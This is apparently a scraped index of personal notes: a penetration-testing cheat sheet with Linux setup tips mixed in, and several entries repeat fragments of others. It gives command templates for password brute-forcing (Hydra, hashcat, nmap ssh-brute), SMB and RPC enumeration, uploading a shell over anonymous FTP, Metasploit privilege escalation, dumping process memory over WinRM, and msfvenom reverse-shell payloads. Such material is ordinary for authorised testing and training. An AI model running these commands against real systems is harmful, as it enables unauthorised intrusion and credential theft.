docs.text: Duplicate Icon - App Launch ¶ Fix ¶ Locate file in /usr/share/applications Copy file to ~/.local/share/applications Open file with text editor Launch the app Run xprop WM_CLASS in terminal & click in app window for results Sample Output WM_CLASS(STRING) = "google-chrome", "Google-chrome" Append StartupWMClass=<result> to file, replacing with the results from before
docs.title: Duplicate Icon - App Launch

docs.text: Locate file in /usr/share/applications Copy file to ~/.local/share/applications Open file with text editor Launch the app Run xprop WM_CLASS in terminal & click in app window for results Sample Output WM_CLASS(STRING) = "google-chrome", "Google-chrome" Append StartupWMClass=<result> to file, replacing with the results from before
docs.title: Fix

docs.text: Bruteforce ¶ Hashcat ¶ Flags ¶ -a : attack-mode -m : hash-type Usage ¶ Use-Cases ¶ Cisco Type-5 ¶ hashcat -a 0 -m 500 <hashfile> <wordlist> --force John the Ripper ¶ Flags ¶ --format : (--list=formats for list) Usage ¶ john <passfile> --wordlist = <wordlist> --format = <hash> Convert File ¶ Directory: sh /usr/share/john SSH ¶ ssh2john.py <input> <output> THC-Hydra ¶ Flags ¶ -l : username | -L : user-list -p : password | -P : pass-list -t : threads Usage ¶ HTTP-Post-Form ¶ hydra -L <userlist> -P <passlist> <target-ip> http-post-form SSH ¶ hydra -L <userlist> -P <passlist> ssh://<target-ip> FTP ¶ hydra -L <userlist> -P <passlist> ftp://<target-ip> Nmap ¶ Flags ¶ -p : port(s) Usage ¶ SSH ¶ nmap -p 22 --script ssh-brute --script-args userdb = users.lst,passdb = pass.lst \ --script-args ssh-brute.timeout = 4s <target-ip>
docs.title: Bruteforce

docs.text: nmap -p 22 --script ssh-brute --script-args userdb = users.lst,passdb = pass.lst \ --script-args ssh-brute.timeout = 4s <target-ip>
docs.title: SSH

docs.text: Enumeration ¶ Port Enumeration ¶ 21 - FTP ¶ Anonymous Login ¶ ftp <target-ip> $> anonymous Test Upload ¶ $> put test.txt If successful, upload shell and browse to file via browser to initiate: ftp://<target-ip>/<file> 22 - SSH ¶ 25 - SMTP ¶ 80/443 - HTTP/HTTPS ¶ Directory Busting ¶ dirb ¶ dirb <url> dirbuster ¶ gobuster ¶ gobuster -u <url> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php 110 - Pop3 ¶ 111 - RPCBind ¶ 139/445 - SMB/RPC ¶ List Shares ¶ nmap ¶ sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <target-ip> smbclient ¶ smbclient -L \\\\ <target-ip> List Domain Users/Groups ¶ rpcclient ¶ rpcclient -U "" -N <target-ip> $> enumdomusers $> enumdomgroups SID Enumeration ¶ impacket - lookupsid ¶ ./lookupsid.py <username>:<password>@<target-ip> WinRM ¶ evil-winrm ¶ evil-winrm -i <target-ip> -u <username> -p <password> 161 - SNMP ¶ snmpwalk ¶ snmpwalk -v2c -c public <target-ip>
docs.title: Enumeration

docs.text: $> put test.txt If successful, upload shell and browse to file via browser to initiate: ftp://<target-ip>/<file>
docs.title: Test Upload

docs.text: Exploitation ¶ Finding Exploits ¶ searchsploit ¶ Search: searchsploit <keyword> Copy Exploit: searchsploit -m <exploit-path>
docs.title: Exploitation

docs.text: Metasploit ¶ Msfconsole ¶ Start ¶ msfconsole -q Meterpreter ¶ Privilege Escalation ¶ Background session, then run local exploit suggester: background use post/multi/recon/local_exploit_suggester set session <sesssion-id> run Misc. ¶ Setup Database (1 st time) ¶ systemctl start postgresql msfdb init Custom modules ¶ Directory: sh ~/.msf4/modules Add custom modules according to msf structure (e.g. ../exploits/webapps/php/<module>)
docs.title: Metasploit

docs.text: Background session, then run local exploit suggester: background use post/multi/recon/local_exploit_suggester set session <sesssion-id> run
docs.title: Privilege Escalation

docs.text: Directory: sh ~/.msf4/modules Add custom modules according to msf structure (e.g. ../exploits/webapps/php/<module>)
docs.title: Custom modules

docs.text: Privilege Escalation ¶ Linux ¶ Manual ¶ Crontab ¶ cat /etc/crontab SUID/GUID ¶ find / -perm -g = s -o -perm -u = s -type f 2 >/dev/null Scripts ¶ LinEnum ¶ wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh ./LinEnum.sh Windows ¶ Manual ¶ Dump Process (via WinRM) ¶ procdump ¶ Upload procdump (lookup & add steps) upload /path/to/strings64.exe ./procdump64.exe --accepteula ./procdump64.exe -ma <pid> strings ¶ Upload strings (lookup & add steps) upload /path/to/strings64.exe cmd /c "strings64.exe --accepteula <dumpfile> > <output>" findstr "<string>" <file> Scripts ¶
docs.title: Privilege Escalation

docs.text: Upload strings (lookup & add steps) upload /path/to/strings64.exe cmd /c "strings64.exe --accepteula <dumpfile> > <output>" findstr "<string>" <file>
docs.title: strings

docs.text: Recon ¶ Host Discovery ¶ netdiscover -r <ip range> Example: netdiscover -r 10 .10.10.0/24 Port Scanning ¶ nmap ¶ ports = $( nmap -p- --min-rate = 3000 -T4 <ip> | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$// ) nmap -sC -sV -oA -p $ports <ip>
docs.title: Recon

docs.text: ports = $( nmap -p- --min-rate = 3000 -T4 <ip> | grep "^[0-9]" | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$// ) nmap -sC -sV -oA -p $ports <ip>
docs.title: nmap

docs.text: Shells ¶ Reverse-Shells ¶ Web-Shells ¶ Msfvenom ¶ Flags ¶ -a : architecture -n : nopsled -b : bad chars -o : outfile -e : encoder -p : payload -f : file format (--help-formats for list) -x : template -i : iterations for encoding Usage ¶ Basic ¶ msfvenom -p <payload> LHOST = <local-ip> LPORT = <local-port> Encoded ¶ msfvenom ... -e <encoding> -i <iterations> Ouput ¶ msfvenom ... -f <format> -o <filename>
docs.title: Shells

docs.text: -a : architecture -n : nopsled -b : bad chars -o : outfile -e : encoder -p : payload -f : file format (--help-formats for list) -x : template -i : iterations for encoding
docs.title: Flags

docs.text: VMware ¶ Installation ¶ Install build packages ¶ sudo apt install build-essential Download VMware ¶ wget --user-agent = "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" https://www.vmware.com/go/getplayer-linux Install VMware ¶ chmod +x getplayer-linux sudo ./getplayer-linux

docs.text: Code ¶ Installation ¶ Import GPG Key & Add Repo to Sources ¶ wget -q https://packages.microsoft.com/keys/microsoft.asc -O- | sudo apt-key add - sudo add-apt-repository "deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main" Install VS Code ¶ sudo apt update sudo apt install -y code
docs.title: VS Code

docs.text: ZSH ¶ Installation ¶ Install Terminator ¶ sudo apt install -y terminator Install ZSH ¶ sudo apt install -y zsh Install Oh-My-ZSH ¶ sh -c " $( curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh ) " Setup Powerline Fonts ¶ sudo apt install -y fonts-powerline Install Solarized ¶ git clone git://github.com/sigurdga/gnome-terminal-colors-solarized.git ~/.solarized cd ~/.solarized ./install.sh
docs.title: ZSH
